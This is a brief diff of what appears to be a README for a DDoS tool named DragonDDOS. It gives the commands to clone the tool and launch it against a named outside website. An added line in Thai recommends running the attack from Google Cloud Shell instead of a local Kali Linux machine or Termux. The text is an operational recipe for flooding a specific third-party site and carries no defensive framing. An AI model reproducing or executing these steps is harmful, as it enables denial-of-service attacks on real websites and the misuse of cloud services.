@@ -27,3 +27,5 @@ git clone https://github.com/Xsarjame/DragonDDOS
 cd DragonDDOS
 
 python2 dragonDDOS.py http://www.navinbcc.com
+
+เชื่อกู รันโค้ดใน https://shell.cloud.google.com/ ดีกว่าเยอะ เพราะใช้ใน kali linux เครื่องคอมมผข้าง ถ้า เป็น TERMUX อย่าหาทำ
